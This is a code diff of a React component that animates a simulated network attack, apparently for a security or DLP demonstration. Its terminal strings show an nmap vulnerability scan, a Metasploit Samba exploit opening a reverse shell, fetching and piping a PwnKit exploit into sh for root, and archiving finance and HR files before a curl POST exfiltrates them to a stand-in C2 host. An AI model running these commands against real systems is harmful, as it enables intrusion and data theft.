@@ -18,12 +18,12 @@ const STEPS = [
     metric: { label: "Ports Discovered", value: "12", sub: "4 hosts up" },
     cmd: [
       "┌──(root㉿kali)-[~]",
-      "└─# nmap -sV -sC -O 192.168.1.0/24 --script vuln",
+      "└─# nmap -sV -sC -O 192.168.100.0/24 --script vuln",
       "",
       "Starting Nmap 7.94SVN ( https://nmap.org )",
       "Scanning 4 hosts [1000 ports/host]...",
       "",
-      "Nmap scan report for 192.168.1.10 (ubuntu-srv)",
+      "Nmap scan report for 192.168.100.10 (ubuntu-dlp-server)",
       "PORT     STATE SERVICE     VERSION",
       "22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu",
       "80/tcp   open  http        Apache httpd 2.4.52",
@@ -34,7 +34,7 @@ const STEPS = [
       "|   State: LIKELY VULNERABLE",
       "|   Risk:  Remote Code Execution",
       "",
-      "Nmap scan report for 192.168.1.20 (win-finance)",
+      "Nmap scan report for 192.168.100.20 (win-axa-ams)",
       "PORT     STATE SERVICE  VERSION",
       "135/tcp  open  msrpc    Windows RPC",
       "445/tcp  open  smb      Windows Server 2019",
@@ -59,22 +59,22 @@ const STEPS = [
       "+ -- --=[ 2397 exploits - 1239 payloads ]",
       "",
       "msf6 > use exploit/linux/samba/is_known_pipename",
-      "msf6 exploit(samba) > set RHOSTS 192.168.1.10",
-      "RHOSTS => 192.168.1.10",
-      "msf6 exploit(samba) > set LHOST 192.168.1.50",
-      "LHOST => 192.168.1.50",
+      "msf6 exploit(samba) > set RHOSTS 192.168.100.10",
+      "RHOSTS => 192.168.100.10",
+      "msf6 exploit(samba) > set LHOST 192.168.100.50",
+      "LHOST => 192.168.100.50",
       "msf6 exploit(samba) > set LPORT 4444",
       "msf6 exploit(samba) > exploit",
       "",
-      "[*] 192.168.1.10:445 - Using location /tmp for writable ...",
-      "[*] Started reverse TCP handler on 192.168.1.50:4444",
-      "[*] 192.168.1.10:445 - Sending stage (3045380 bytes)...",
-      "[+] 192.168.1.10:445 - Meterpreter session 1 opened!",
+      "[*] 192.168.100.10:445 - Using location /tmp for writable ...",
+      "[*] Started reverse TCP handler on 192.168.100.50:4444",
+      "[*] 192.168.100.10:445 - Sending stage (3045380 bytes)...",
+      "[+] 192.168.100.10:445 - Meterpreter session 1 opened!",
       "",
       "meterpreter > getuid",
       "Server username: www-data",
       "meterpreter > sysinfo",
-      "Computer     : ubuntu-server",
+      "Computer     : ubuntu-dlp-server",
       "OS           : Ubuntu 22.04 (Linux 5.15.0-91)",
       "Architecture : x64",
       "Meterpreter  : x64/linux",
@@ -91,25 +91,25 @@ const STEPS = [
       "meterpreter > shell",
       "Process 2847 created.",
       "",
-      "www-data@ubuntu-server:/$ id",
+      "www-data@ubuntu-dlp-server:/$ id",
       "uid=33(www-data) gid=33(www-data)",
       "",
-      "www-data@ubuntu-server:/$ wget -q http://192.168.1.50:8080/linpeas.sh",
-      "www-data@ubuntu-server:/$ chmod +x linpeas.sh && ./linpeas.sh",
+      "www-data@ubuntu-dlp-server:/$ wget -q http://192.168.100.50:8080/linpeas.sh",
+      "www-data@ubuntu-dlp-server:/$ chmod +x linpeas.sh && ./linpeas.sh",
       "",
       "╔══════════╣ CVE-2021-4034 (PwnKit)",
       "║ pkexec --version → 0.105",
       "╚ Status: VULNERABLE ← polkit < 0.120",
       "",
-      "www-data@ubuntu-server:/$ curl -sL http://192.168.1.50:8080/pwnkit | sh",
+      "www-data@ubuntu-dlp-server:/$ curl -sL http://192.168.100.50:8080/pwnkit | sh",
       "",
       "[*] Overwriting /usr/bin/pkexec...",
       "[*] Triggering SUID binary...",
       "[+] uid=0(root) gid=0(root) groups=0(root)",
       "",
-      "root@ubuntu-server:/# whoami && hostname",
+      "root@ubuntu-dlp-server:/# whoami && hostname",
       "root",
-      "ubuntu-server",
+      "ubuntu-dlp-server",
     ],
   },
   {
@@ -120,7 +120,7 @@ const STEPS = [
     result: "4.2 MB exfiltrated",
     metric: { label: "Data Exfiltrated", value: "4.2 MB", sub: "No DLP block" },
     cmd: [
-      "root@ubuntu-server:/# find / -name '*.xlsx' -o -name '*.csv' \\",
+      "root@ubuntu-dlp-server:/# find / -name '*.xlsx' -o -name '*.csv' \\",
       "  -o -name '*.pdf' 2>/dev/null | head -20",
       "",
       "/home/finance/Q4-Budget-2025.xlsx        (2.1 MB)",
@@ -128,13 +128,13 @@ const STEPS = [
       "/home/rh/employee-salaries.xlsx          (890 KB)",
       "/home/rh/contrats-CDI-2024.pdf           (1.2 MB)",
       "",
-      "root@ubuntu-server:/# tar czf /tmp/.cache.tar.gz \\",
+      "root@ubuntu-dlp-server:/# tar czf /tmp/.cache.tar.gz \\",
       "  /home/finance/ /home/rh/ 2>/dev/null",
       "",
-      "root@ubuntu-server:/# ls -lh /tmp/.cache.tar.gz",
+      "root@ubuntu-dlp-server:/# ls -lh /tmp/.cache.tar.gz",
       "-rw-r--r-- 1 root root 4.2M Feb 28 03:14 /tmp/.cache.tar.gz",
       "",
-      "root@ubuntu-server:/# curl -sk -X POST \\",
+      "root@ubuntu-dlp-server:/# curl -sk -X POST \\",
       "  https://c2.attacker-infra.net/exfil \\",
       "  -H 'X-Key: a8f3...' \\",
       "  -F 'file=@/tmp/.cache.tar.gz'",
@@ -255,21 +255,21 @@ function Terminal({ lines, label, active, stepColor }) {
    Realistic Network Topology SVG
    ────────────────────────────────────────────────────────────
    Layout:
-   
+
    [ATTACKER ZONE]       [INTERNAL LAN]             [INTERNET]
-     Kali Linux  ── vSwitch ── Ubuntu Server ─── C2 Server
+     Kali Linux  ── vSwitch ── SOC Server ─── C2 Server
                        │
-                 Win-Finance
+                 AXA AMS (Finance)
    ──────────────────────────────────────────────────────────── */
 function NetworkMap({ activeStep }) {
   const ref = useRef(null);
   const isInView = useInView(ref, { once: true, margin: "-40px" });
 
   const nodes = [
-    { id: "kali",     label: "Kali Linux",     sub: "192.168.1.50",   x: 80,  y: 90,  w: 68, h: 52, zone: "attacker" },
-    { id: "switch",   label: "vSwitch",        sub: "VMnet (NAT)",    x: 250, y: 90,  w: 56, h: 52, zone: "internal" },
-    { id: "ubuntu",   label: "Ubuntu Srv",     sub: "192.168.1.10",   x: 420, y: 55,  w: 68, h: 52, zone: "internal" },
-    { id: "finance",  label: "Win-Finance",    sub: "192.168.1.20",   x: 420, y: 140, w: 68, h: 52, zone: "internal" },
+    { id: "kali",     label: "Kali Linux",     sub: "192.168.100.50",   x: 80,  y: 90,  w: 68, h: 52, zone: "attacker" },
+    { id: "switch",   label: "vSwitch",        sub: "Host-Only",      x: 250, y: 90,  w: 56, h: 52, zone: "internal" },
+    { id: "ubuntu",   label: "SOC Server",     sub: "192.168.100.10",   x: 420, y: 55,  w: 68, h: 52, zone: "internal" },
+    { id: "finance",  label: "AXA AMS",        sub: "192.168.100.20",   x: 420, y: 140, w: 68, h: 52, zone: "internal" },
     { id: "c2",       label: "C2 Server",      sub: "ext:443",        x: 610, y: 90,  w: 60, h: 52, zone: "external" },
   ];
 
@@ -377,10 +377,14 @@ function NetworkMap({ activeStep }) {
               {on && (
                 <>
                   <motion.circle r={2.5} fill="#ef4444"
+                    cx={ax} cy={ay}
+                    initial={{ cx: ax, cy: ay, opacity: 0 }}
                     animate={{ cx: [ax, bx], cy: [ay, by], opacity: [0, 1, 1, 0] }}
                     transition={{ duration: 1.5, repeat: Infinity, repeatDelay: 0.5, delay: i * 0.15 }}
                     filter="url(#glow-red)" />
                   <motion.circle r={5} fill="none" stroke="#ef4444" strokeWidth={0.3}
+                    cx={ax} cy={ay}
+                    initial={{ cx: ax, cy: ay, opacity: 0 }}
                     animate={{ cx: [ax, bx], cy: [ay, by], opacity: [0, 0.15, 0] }}
                     transition={{ duration: 1.5, repeat: Infinity, repeatDelay: 0.5, delay: i * 0.15 }} />
                 </>
@@ -478,7 +482,7 @@ function NetworkMap({ activeStep }) {
                   ))}
                   {/* VMnet label */}
                   <text x={n.x + 28} y={n.y + 46} fill={on ? "#3b82f680" : "#1e293b"} fontSize="3.5"
-                    textAnchor="middle" fontFamily="monospace">VMnet8</text>
+                    textAnchor="middle" fontFamily="monospace">Host-Only</text>
                 </g>
               )}
 
@@ -623,7 +627,7 @@ function NetworkMap({ activeStep }) {
 /* ── Live Attack Metrics Panel ── */
 function AttackMetrics({ activeStep, done }) {
   const metrics = [
-    { label: "Target",      value: activeStep >= 0 ? "192.168.1.0/24" : "—", color: "#f59e0b" },
+    { label: "Target",      value: activeStep >= 0 ? "192.168.100.0/24" : "—", color: "#f59e0b" },
     { label: "Phase",       value: activeStep >= 0 ? STEPS[activeStep].name : "Idle", color: STEPS[Math.max(0, activeStep)]?.color || "#6272a4" },
     { label: "Sessions",    value: activeStep >= 1 ? "1" : "0", color: activeStep >= 1 ? "#ef4444" : "#6272a4" },
     { label: "Privilege",   value: activeStep >= 2 ? "root" : activeStep >= 1 ? "www-data" : "—", color: activeStep >= 2 ? "#a855f7" : "#6272a4" },
